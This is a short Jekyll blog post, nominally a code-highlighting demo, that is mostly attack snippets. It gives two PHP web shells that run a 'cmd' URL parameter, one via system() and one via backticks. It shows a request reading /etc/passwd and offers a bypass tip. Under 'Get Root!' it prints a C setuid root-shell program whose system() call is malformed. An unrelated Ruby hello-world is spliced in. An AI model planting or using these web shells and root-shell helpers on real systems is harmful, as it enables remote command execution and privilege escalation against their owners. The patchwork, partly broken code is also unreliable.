---
layout: post
title:  "Code Example"
date:   2019-05-15 14:37:44 -0500
author: Larry Brown
category: Dev
tags: [code, web, jekyll]
---

This is some text before my code example

{% highlight php %}

# get query string parameter 'cmd'
// get query string parameter 'cmd'
/* get query string parameter 'cmd' */
<?php echo system($_GET["cmd"]); ?>

{% endhighlight %}

Then request vulnerable page with the command you want to run in the parameters:
http://HOST/vuln.php?cmd=cat /etc/passwd

If the system command is restricted, you might can use backticks (\`) to execute system commands.

```php
# get query string parameter 'cmd'
// get query string parameter 'cmd'
/* get query string parameter 'cmd' */
<?php $cmd=$_GET["cmd"]; echo `$cmd`; ?>

```

This is some text after it


```ruby
def print_hi(name)
  puts "Hi, #{name}"
end
print_hi('Tom')
#=> prints 'Hi, Tom' to STDOUT.
```

Get Root!


```c
#include <unistd.h>

main( int argc, char ** argv, char ** envp )
{
    setgid(0);
    setuid(0);
    system("/bin/bash", argv, envp);
    return 0;
}
```













